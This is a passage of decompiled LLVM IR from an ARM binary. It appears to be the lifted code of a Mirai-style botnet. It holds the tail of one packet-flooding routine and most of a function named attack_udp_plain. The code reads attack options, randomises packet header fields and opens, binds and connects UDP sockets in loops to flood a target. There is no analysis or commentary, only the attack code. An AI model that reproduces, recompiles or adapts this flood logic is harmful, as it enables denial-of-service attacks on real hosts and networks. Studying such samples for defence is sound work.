  %v1_c840 = load i32, i32* %r3.global-to-local, align 4
  %tmp70 = mul i32 %v1_c840, -8
  %v5_c840 = add i32 %v0_c840, %tmp70
  store i32 %v5_c840, i32* %lr.global-to-local, align 4
  %v0_c844 = load i32, i32* @r6, align 4
  %v1_c844 = add i32 %v0_c844, 2
  %v2_c844 = inttoptr i32 %v1_c844 to i16*
  %v3_c844 = load i16, i16* %v2_c844, align 2
  %v4_c844 = zext i16 %v3_c844 to i32
  store i32 %v4_c844, i32* @r6, align 4
  %v1_c848 = load i32, i32* @r7, align 4
  %v2_c848 = add i32 %v1_c848, %v5_c840
  store i32 %v2_c848, i32* @lr, align 4
  %v3_c84c = add i32 %v2_c848, 2
  %v4_c84c = inttoptr i32 %v3_c84c to i16*
  store i16 %v3_c844, i16* %v4_c84c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c858 = load i32, i32* @r5, align 4
  store i32 %v0_c858, i32* %r1.global-to-local, align 4
  %v0_c85c = load i32, i32* @r8, align 4
  store i32 %v0_c85c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c864 = load i32, i32* @lr, align 4
  %v6_c86c = call i32 @__libc_sendto(i32 %v0_c85c, i32 %v0_c858, i32 60, i32 16384, i32 %v0_c864, i32 16)
  %v3_c870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c870, i32* %r3.global-to-local, align 4
  %v1_c874 = add i32 %v3_c870, 1
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  %v1_c878 = load i32, i32* @sb, align 4
  %v9_c878 = icmp eq i32 %v1_c874, %v1_c878
  store i1 %v9_c878, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c874, i32* %stack_var_-44, align 4
  %v6_c880 = icmp slt i32 %v1_c874, %v1_c878
  br i1 %v6_c880, label %dec_label_pc_c884, label %dec_label_pc_c98c

dec_label_pc_c884:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c7a0
  %v1_c894 = phi i32 [ %v1_c874, %dec_label_pc_c800 ], [ 0, %dec_label_pc_c7a0 ]
  %v5_c888 = mul i32 %v1_c894, 24
  %v1_c88c = load i32, i32* @r7, align 4
  %v2_c88c = add i32 %v1_c88c, %v5_c888
  store i32 %v2_c88c, i32* %r3.global-to-local, align 4
  %v1_c890 = add i32 %v2_c88c, 20
  %v2_c890 = inttoptr i32 %v1_c890 to i8*
  %v3_c890 = load i8, i8* %v2_c890, align 1
  %v4_c890 = zext i8 %v3_c890 to i32
  store i32 %v4_c890, i32* %r2.global-to-local, align 4
  %v0_c894 = load i32, i32* @sl, align 4
  %v4_c894 = mul i32 %v1_c894, 4
  %v5_c894 = add i32 %v0_c894, %v4_c894
  %v6_c894 = inttoptr i32 %v5_c894 to i32*
  %v7_c894 = load i32, i32* %v6_c894, align 4
  store i32 %v7_c894, i32* @r5, align 4
  %v2_c898 = icmp ugt i8 %v3_c890, 30
  %v7_c898 = icmp eq i8 %v3_c890, 31
  store i1 %v7_c898, i1* %cpsr_z.global-to-local, align 1
  %v1_c89c = add i32 %v7_c894, 20
  store i32 %v1_c89c, i32* @r6, align 4
  %v2_c8a0 = xor i1 %v7_c898, true
  %v3_c8a0 = and i1 %v2_c898, %v2_c8a0
  br i1 %v3_c8a0, label %dec_label_pc_c7a8, label %dec_label_pc_c8a4

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c884
  %v1_c8a4 = add i32 %v2_c88c, 16
  %v2_c8a4 = inttoptr i32 %v1_c8a4 to i32*
  %v3_c8a4 = load i32, i32* %v2_c8a4, align 4
  store i32 %v3_c8a4, i32* %r4.global-to-local, align 4
  %v0_c8a8 = call i32 @rand_next()
  store i32 %v0_c8a8, i32* %r0.global-to-local, align 4
  %v3_c8ac = load i32, i32* %stack_var_-44, align 4
  %v5_c8b4 = mul i32 %v3_c8ac, 24
  %v0_c8b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c8b8 = and i32 %v0_c8b8, 16711680
  %v3_c8bc = udiv i32 %v0_c8b8, 16777216
  %v4_c8c0 = udiv i32 %v1_c8b8, 256
  %v5_c8c0 = or i32 %v4_c8c0, %v3_c8bc
  store i32 %v5_c8c0, i32* %r2.global-to-local, align 4
  %v1_c8c4 = load i32, i32* @r7, align 4
  %v2_c8c4 = add i32 %v1_c8c4, %v5_c8b4
  store i32 %v2_c8c4, i32* %r1.global-to-local, align 4
  %v1_c8c8 = and i32 %v0_c8b8, 65280
  store i32 %v1_c8c8, i32* %r3.global-to-local, align 4
  %v1_c8cc = add i32 %v2_c8c4, 20
  %v2_c8cc = inttoptr i32 %v1_c8cc to i8*
  %v3_c8cc = load i8, i8* %v2_c8cc, align 1
  %v4_c8cc = zext i8 %v3_c8cc to i32
  %v5_c8d4 = call i32 @llvm.bswap.i32(i32 %v0_c8b8)
  %v7_c8d8 = lshr i32 %v0_c8a8, %v4_c8cc
  %v8_c8d8 = add i32 %v7_c8d8, %v5_c8d4
  store i32 %v8_c8d8, i32* %r2.global-to-local, align 4
  %v1_c8dc = and i32 %v8_c8d8, 16711680
  store i32 %v1_c8dc, i32* %r0.global-to-local, align 4
  %v1_c8e8 = and i32 %v8_c8d8, 65280
  store i32 %v1_c8e8, i32* %r1.global-to-local, align 4
  %v5_c8f0 = call i32 @llvm.bswap.i32(i32 %v8_c8d8)
  %v1_c8f4 = load i32, i32* @r5, align 4
  %v2_c8f4 = add i32 %v1_c8f4, 16
  %v3_c8f4 = inttoptr i32 %v2_c8f4 to i32*
  store i32 %v5_c8f0, i32* %v3_c8f4, align 4
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c904:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  %v0_c904 = call i32 @rand_next()
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %r4.global-to-local, align 4
  %v1_c90c = load i32, i32* @r5, align 4
  %v2_c90c = add i32 %v1_c90c, 12
  %v3_c90c = inttoptr i32 %v2_c90c to i32*
  store i32 %v0_c904, i32* %v3_c90c, align 4
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  %v0_c914 = load i32, i32* %r4.global-to-local, align 4
  %v1_c914 = add i32 %v0_c914, -1
  store i32 %v1_c914, i32* @r4, align 4
  %v9_c918 = icmp eq i32 %v3_c520, %v1_c914
  store i1 %v9_c918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c918, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c920:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v0_c920 = call i32 @rand_next()
  %v1_c920 = trunc i32 %v0_c920 to i16
  store i32 %v0_c920, i32* %r0.global-to-local, align 4
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v1_c928 = load i32, i32* @r4, align 4
  %v9_c928 = icmp eq i32 %v3_c524, %v1_c928
  store i1 %v9_c928, i1* %cpsr_z.global-to-local, align 1
  %v3_c92c = load i32, i32* @r5, align 4
  %v4_c92c = add i32 %v3_c92c, 4
  %v5_c92c = inttoptr i32 %v4_c92c to i16*
  store i16 %v1_c920, i16* %v5_c92c, align 2
  br i1 %v9_c928, label %dec_label_pc_c934, label %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge

dec_label_pc_c920.dec_label_pc_c7d4_crit_edge:    ; preds = %dec_label_pc_c920
  %v1_c7d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7d4

dec_label_pc_c934:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c7c8
  %v0_c934 = call i32 @rand_next()
  %v1_c934 = trunc i32 %v0_c934 to i16
  store i32 %v0_c934, i32* %r0.global-to-local, align 4
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v1_c93c = load i32, i32* @r4, align 4
  %v9_c93c = icmp eq i32 %v3_c528, %v1_c93c
  store i1 %v9_c93c, i1* %cpsr_z.global-to-local, align 1
  %v3_c940 = load i32, i32* @r5, align 4
  %v4_c940 = add i32 %v3_c940, 20
  %v5_c940 = inttoptr i32 %v4_c940 to i16*
  store i16 %v1_c934, i16* %v5_c940, align 2
  br i1 %v9_c93c, label %dec_label_pc_c948, label %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge

dec_label_pc_c934.dec_label_pc_c7e0_crit_edge:    ; preds = %dec_label_pc_c934
  %v1_c7e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7e0

dec_label_pc_c948:                                ; preds = %dec_label_pc_c934, %dec_label_pc_c7d4
  %v0_c948 = call i32 @rand_next()
  %v1_c948 = trunc i32 %v0_c948 to i16
  store i32 %v0_c948, i32* %r0.global-to-local, align 4
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v1_c950 = load i32, i32* @r4, align 4
  %v9_c950 = icmp eq i32 %v5_c3e0, %v1_c950
  store i1 %v9_c950, i1* %cpsr_z.global-to-local, align 1
  %v3_c954 = load i32, i32* @r6, align 4
  %v4_c954 = add i32 %v3_c954, 2
  %v5_c954 = inttoptr i32 %v4_c954 to i16*
  store i16 %v1_c948, i16* %v5_c954, align 2
  br i1 %v9_c950, label %dec_label_pc_c95c, label %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge

dec_label_pc_c948.dec_label_pc_c7ec_crit_edge:    ; preds = %dec_label_pc_c948
  %v1_c7f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c7ec

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c948, %dec_label_pc_c7e0
  %v0_c95c = call i32 @rand_next()
  %v1_c960 = load i32, i32* @r6, align 4
  %v2_c960 = add i32 %v1_c960, 4
  %v3_c960 = inttoptr i32 %v2_c960 to i32*
  store i32 %v0_c95c, i32* %v3_c960, align 4
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v1_c968 = load i32, i32* @r4, align 4
  %v9_c968 = icmp eq i32 %v6_c3f8, %v1_c968
  store i1 %v9_c968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c968, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c970:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c970 = call i32 @rand_next()
  store i32 %v0_c970, i32* %r0.global-to-local, align 4
  %v0_c974 = load i32, i32* @fp, align 4
  %v2_c974 = icmp eq i32 %v0_c974, 0
  store i1 %v2_c974, i1* %cpsr_z.global-to-local, align 1
  %v1_c978 = load i32, i32* @r6, align 4
  %v2_c978 = add i32 %v1_c978, 8
  %v3_c978 = inttoptr i32 %v2_c978 to i32*
  store i32 %v0_c970, i32* %v3_c978, align 4
  br i1 %v2_c974, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970
  %v0_c980 = call i32 @rand_next()
  %v1_c980 = trunc i32 %v0_c980 to i16
  store i32 %v0_c980, i32* %r0.global-to-local, align 4
  %v3_c984 = load i32, i32* @r6, align 4
  %v4_c984 = add i32 %v3_c984, 18
  %v5_c984 = inttoptr i32 %v4_c984 to i16*
  store i16 %v1_c980, i16* %v5_c984, align 2
  br label %dec_label_pc_c800

dec_label_pc_c98c:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c990 = call i32 @__GI_time(i32* null)
  store i32 %v2_c990, i32* %r0.global-to-local, align 4
  store i32 %v2_c4b4, i32* %r3.global-to-local, align 4
  %v9_c998 = icmp eq i32 %v2_c4b4, %v2_c990
  store i1 %v9_c998, i1* %cpsr_z.global-to-local, align 1
  %v6_c99c = icmp slt i32 %v2_c4b4, %v2_c990
  br i1 %v6_c99c, label %dec_label_pc_c9a0, label %dec_label_pc_c98c.dec_label_pc_c790_crit_edge

dec_label_pc_c98c.dec_label_pc_c790_crit_edge:    ; preds = %dec_label_pc_c98c
  %v0_c794.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c790

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c98c, %entry, %dec_label_pc_c9ac
  %v1_c9a8 = phi i32 [ %v3_c4c8, %entry ], [ %v1_c9b0, %dec_label_pc_c9ac ], [ %v2_c990, %dec_label_pc_c98c ]
  store i32 %v3_c2e4, i32* %r4.global-to-local, align 4
  store i32 %v24_c2e4, i32* %fp.global-to-local, align 4
  store i32 %v27_c2e4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c9a8

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c4d8
  %v0_c9ac = load i32, i32* @r8, align 4
  store i32 %v0_c9ac, i32* %r0.global-to-local, align 4
  %v1_c9b0 = call i32 @__GI___libc_close(i32 %v0_c9ac)
  store i32 %v1_c9b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c9a0

; uselistorder directives
  uselistorder i32 %v1_c9b0, { 1, 0 }
  uselistorder i32 %v0_c980, { 1, 0 }
  uselistorder i32 %v0_c948, { 1, 0 }
  uselistorder i32 %v0_c934, { 1, 0 }
  uselistorder i32 %v0_c920, { 1, 0 }
  uselistorder i32 %v1_c914, { 1, 2, 0 }
  uselistorder i32 %v0_c8b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c874, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c840, { 1, 0 }
  uselistorder i32 %v4_c830, { 1, 0 }
  uselistorder i1 %v7_c7ac, { 2, 1, 0 }
  uselistorder i32 %v2_c780, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c5e8, { 1, 2, 0 }
  uselistorder i32 %v1_c5ac, { 2, 1, 0 }
  uselistorder i32 %v1_c5a8, { 2, 0, 1 }
  uselistorder i32 %v1_c5a4, { 2, 0, 1 }
  uselistorder i32 %v1_c5a0, { 2, 0, 1 }
  uselistorder i32 %v1_c59c, { 2, 0, 1 }
  uselistorder i32 %v3_c524, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_c520, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_c514, { 1, 0, 2 }
  uselistorder i1 %v7_c4f8, { 1, 0 }
  uselistorder i1 %v7_c4cc, { 1, 0 }
  uselistorder i32 %v3_c4c8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_c4b4, { 2, 1, 0 }
  uselistorder i32 %v6_c4a4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v6_c3f8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c3e0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c364, { 1, 0 }
  uselistorder i32 %v7_c34c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 8, 10, 11, 9, 12, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 36, 33, 34, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 57, { 6, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 58, { 6, 7, 8, 9, 0, 3, 1, 4, 2, 5 }
  uselistorder i32 45, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 42, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 247, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_c9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c980, { 1, 0 }
  uselistorder label %dec_label_pc_c800, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-80, align 4
  %v2_c9e0 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c9ec = load i32, i32* @fp, align 4
  store i32 %v0_c9ec, i32* %r0.global-to-local, align 4
  %v2_c9f0 = call i32 @calloc(i32 %v0_c9ec, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r6, align 4
  %v0_c9fc = load i32, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 %v2_c9f0, i32* @sb, align 4
  %v0_ca0c = load i32, i32* @r4, align 4
  store i32 %v0_ca0c, i32* %r0.global-to-local, align 4
  %v4_ca10 = inttoptr i32 %v0_c9fc to i32*
  %v5_ca10 = call i32 @attack_get_opt_int(i32 %v0_ca0c, i32* %v4_ca10, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_ca14 = load i32, i32* @r5, align 4
  %v0_ca20 = load i32, i32* @r6, align 4
  store i32 %v0_ca20, i32* %r3.global-to-local, align 4
  %v0_ca24 = load i32, i32* @r4, align 4
  store i32 %v0_ca24, i32* %r0.global-to-local, align 4
  %v3_ca28 = urem i32 %v5_ca10, 65536
  store i32 %v3_ca28, i32* @r8, align 4
  %v4_ca2c = inttoptr i32 %v0_ca14 to i32*
  %v5_ca2c = call i32 @attack_get_opt_int(i32 %v0_ca24, i32* %v4_ca2c, i32 6, i32 %v0_ca20)
  %v0_ca30 = load i32, i32* @r5, align 4
  %v3_ca34 = mul i32 %v5_ca2c, 65536
  store i32 %v3_ca34, i32* @sl, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_ca40 = load i32, i32* @r4, align 4
  store i32 %v0_ca40, i32* %r0.global-to-local, align 4
  %v4_ca44 = inttoptr i32 %v0_ca30 to i32*
  %v5_ca44 = call i32 @attack_get_opt_int(i32 %v0_ca40, i32* %v4_ca44, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ca54 = urem i32 %v5_ca44, 65536
  %v0_ca58 = load i32, i32* @r5, align 4
  %v0_ca5c = load i32, i32* @r4, align 4
  store i32 %v0_ca5c, i32* %r0.global-to-local, align 4
  %v4_ca64 = inttoptr i32 %v0_ca58 to i32*
  %v5_ca64 = call i32 @attack_get_opt_int(i32 %v0_ca5c, i32* %v4_ca64, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ca70 = urem i32 %v5_ca64, 256
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_ca8c = call i32 @__GI_time(i32* null)
  store i32 %v2_ca8c, i32* %r0.global-to-local, align 4
  %v0_ca90 = load i32, i32* @sl, align 4
  %v3_ca90 = udiv i32 %v0_ca90, 65536
  %v1_ca94 = load i32, i32* @r6, align 4
  %v9_ca94 = icmp eq i32 %v3_ca90, %v1_ca94
  br i1 %v9_ca94, label %dec_label_pc_cc68, label %bb

bb:                                               ; preds = %entry
  %v4_ca9c = udiv i32 %v0_ca90, 16777216
  store i32 %v4_ca9c, i32* %r3.global-to-local, align 4
  %v1_caa0 = load i32, i32* @r7, align 4
  %v2_caa0 = add i32 %v1_caa0, %v2_ca8c
  store i32 %v2_caa0, i32* %r0.global-to-local, align 4
  %v2_ca98 = mul nuw nsw i32 %v3_ca90, 256
  %v6_caa4 = or i32 %v2_ca98, %v4_ca9c
  %extract.t58 = trunc i32 %v6_caa4 to i16
  br label %dec_label_pc_cab4

dec_label_pc_cab4:                                ; preds = %bb, %dec_label_pc_cc68
  %v6_caa4.sink.off0 = phi i16 [ %extract.t58, %bb ], [ %extract.t59, %dec_label_pc_cc68 ]
  %v0_caa810 = phi i32 [ %v2_caa0, %bb ], [ %v2_caa013, %dec_label_pc_cc68 ]
  %v0_cab4 = load i32, i32* @fp, align 4
  %v2_cab4 = icmp eq i32 %v0_cab4, 0
  br i1 %v2_cab4, label %dec_label_pc_cbec, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_cab4
  store i32 0, i32* @sl, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v2_cae8 = ptrtoint i32* %stack_var_-56 to i32
  %v4_cb08 = sext i16 %v6_caa4.sink.off0 to i32
  br label %dec_label_pc_cb3c

dec_label_pc_cacc:                                ; preds = %.thread26, %dec_label_pc_cb78
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_cad8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_cad8, i32* %r0.global-to-local, align 4
  %v7_cadc = icmp eq i32 %v3_cad8, -1
  %v0_cae0 = load i32, i32* @sl, align 4
  %v1_cae0 = add i32 %v0_cae0, 1
  store i32 %v1_cae0, i32* @sl, align 4
  %v0_cae4 = load i32, i32* @r7, align 4
  %v1_cae4 = add i32 %v0_cae4, 24
  store i32 %v1_cae4, i32* @r7, align 4
  %v1_caf0 = load i32, i32* @r6, align 4
  %v2_caf0 = load i32, i32* @sb, align 4
  %v3_caf0 = add i32 %v2_caf0, %v1_caf0
  %v4_caf0 = inttoptr i32 %v3_caf0 to i32*
  store i32 %v3_cad8, i32* %v4_caf0, align 4
  br i1 %v7_cadc, label %dec_label_pc_cc10.loopexit14, label %dec_label_pc_caf8

dec_label_pc_caf8:                                ; preds = %dec_label_pc_cacc
  store i32 2, i32* %stack_var_-56, align 4
  store i32 %v4_cb08, i32* %r3.global-to-local, align 4
  %v0_cb10 = load i32, i32* %r0.global-to-local, align 4
  %v3_cb10 = call i32 @bind(i32 %v0_cb10, i32 %v2_cae8, i32 16)
  store i32 %v3_cb10, i32* %r0.global-to-local, align 4
  %v0_cb14 = load i32, i32* @r5, align 4
  %v1_cb14 = add i32 %v0_cb14, 20
  %v2_cb14 = inttoptr i32 %v1_cb14 to i8*
  %v3_cb14 = load i8, i8* %v2_cb14, align 1
  %v4_cb14 = zext i8 %v3_cb14 to i32
  store i32 %v4_cb14, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_cb14, 32
  br i1 %tmp, label %dec_label_pc_cb8c, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_caf8
  %v0_cb20 = load i32, i32* @r6, align 4
  %v1_cb20 = load i32, i32* @sb, align 4
  %v2_cb20 = add i32 %v1_cb20, %v0_cb20
  %v3_cb20 = inttoptr i32 %v2_cb20 to i32*
  %v4_cb20 = load i32, i32* %v3_cb20, align 4
  store i32 %v4_cb20, i32* %r0.global-to-local, align 4
  %v3_cb2c = call i32 @__libc_connect(i32 %v4_cb20, i32 %v0_cb14, i32 16)
  store i32 %v3_cb2c, i32* %r0.global-to-local, align 4
  %v0_cb30 = load i32, i32* @sl, align 4
  %v1_cb30 = load i32, i32* @fp, align 4
  %v9_cb30 = icmp eq i32 %v0_cb30, %v1_cb30
  %v0_cb34 = load i32, i32* @r6, align 4
  %v1_cb34 = add i32 %v0_cb34, 4
  store i32 %v1_cb34, i32* @r6, align 4
  br i1 %v9_cb30, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cabc
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r0.global-to-local, align 4
  %v2_cb4c = call i32 @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32 1)
  store i32 %v2_cb4c, i32* %r0.global-to-local, align 4
  %v0_cb50 = load i32, i32* @r8, align 4
  %v3_cb54 = udiv i32 %v0_cb50, 256
  %v1_cb50 = mul i32 %v0_cb50, 256
  %v4_cb58 = and i32 %v1_cb50, 65280
  %v5_cb58 = or i32 %v4_cb58, %v3_cb54
  store i32 %v5_cb58, i32* %r3.global-to-local, align 4
  %v2_cb5c = load i32, i32* %stack_var_-80, align 4
  %v1_cb60 = load i32, i32* @r7, align 4
  %v2_cb60 = add i32 %v1_cb60, %v2_cb5c
  store i32 %v2_cb60, i32* @r5, align 4
  %v1_cb68 = load i32, i32* @r4, align 4
  %v9_cb68 = icmp eq i32 %v0_cb50, %v1_cb68
  %v1_cb6c = load i32, i32* @r6, align 4
  %v3_cb6c = add i32 %v1_cb6c, %v2_c9e0
  %v4_cb6c = inttoptr i32 %v3_cb6c to i32*
  store i32 %v2_cb4c, i32* %v4_cb6c, align 4
  br i1 %v9_cb68, label %dec_label_pc_cb78, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_cb3c
  %v1_cb7027 = load i32, i32* %r3.global-to-local, align 4
  %v2_cb7028 = trunc i32 %v1_cb7027 to i16
  %v3_cb7029 = load i32, i32* @r5, align 4
  %v4_cb7030 = add i32 %v3_cb7029, 2
  %v5_cb7031 = inttoptr i32 %v4_cb7030 to i16*
  store i16 %v2_cb7028, i16* %v5_cb7031, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb3c
  %v0_cb78 = call i32 @rand_next()
  %v1_cb78 = trunc i32 %v0_cb78 to i16
  store i32 %v0_cb78, i32* %r0.global-to-local, align 4
  %v2_cb7c = load i32, i32* %stack_var_-80, align 4
  store i32 %v2_cb7c, i32* %r3.global-to-local, align 4
  %v1_cb80 = load i32, i32* @r7, align 4
  %v2_cb80 = add i32 %v1_cb80, %v2_cb7c
  store i32 %v2_cb80, i32* @r5, align 4
  %v4_cb84 = add i32 %v2_cb80, 2
  %v5_cb84 = inttoptr i32 %v4_cb84 to i16*
  store i16 %v1_cb78, i16* %v5_cb84, align 2
  br label %dec_label_pc_cacc

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_caf8
  %v1_cb8c = add i32 %v0_cb14, 16
  %v2_cb8c = inttoptr i32 %v1_cb8c to i32*
  %v3_cb8c = load i32, i32* %v2_cb8c, align 4
  store i32 %v3_cb8c, i32* @r4, align 4
  %v0_cb90 = call i32 @rand_next()
  store i32 %v0_cb90, i32* %r0.global-to-local, align 4
  %v0_cb94 = load i32, i32* @r4, align 4
  %v1_cba0 = and i32 %v0_cb94, 65280
  store i32 %v1_cba0, i32* %r3.global-to-local, align 4
  %v0_cba4 = load i32, i32* @r5, align 4
  %v1_cba4 = add i32 %v0_cba4, 20
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v4_cba4 = zext i8 %v3_cba4 to i32
  %v5_cbac = call i32 @llvm.bswap.i32(i32 %v0_cb94)
  %v7_cbb0 = lshr i32 %v0_cb90, %v4_cba4
  %v8_cbb0 = add i32 %v7_cbb0, %v5_cbac
  %v1_cbb4 = and i32 %v8_cbb0, 16711680
  store i32 %v1_cbb4, i32* %r0.global-to-local, align 4
  %v5_cbc8 = call i32 @llvm.bswap.i32(i32 %v8_cbb0)
  store i32 %v5_cbc8, i32* %r3.global-to-local, align 4
  %v2_cbcc = add i32 %v0_cba4, 4
  %v3_cbcc = inttoptr i32 %v2_cbcc to i32*
  store i32 %v5_cbc8, i32* %v3_cbcc, align 4
  %v0_cbd0 = load i32, i32* @r5, align 4
  %v0_cbd4 = load i32, i32* @r6, align 4
  %v1_cbd4 = load i32, i32* @sb, align 4
  %v2_cbd4 = add i32 %v1_cbd4, %v0_cbd4
  %v3_cbd4 = inttoptr i32 %v2_cbd4 to i32*
  %v4_cbd4 = load i32, i32* %v3_cbd4, align 4
  store i32 %v4_cbd4, i32* %r0.global-to-local, align 4
  %v3_cbdc = call i32 @__libc_connect(i32 %v4_cbd4, i32 %v0_cbd0, i32 16)
  store i32 %v3_cbdc, i32* %r0.global-to-local, align 4
  %v0_cbe0 = load i32, i32* @sl, align 4
  %v1_cbe0 = load i32, i32* @fp, align 4
  %v9_cbe0 = icmp eq i32 %v0_cbe0, %v1_cbe0
  %v0_cbe4 = load i32, i32* @r6, align 4
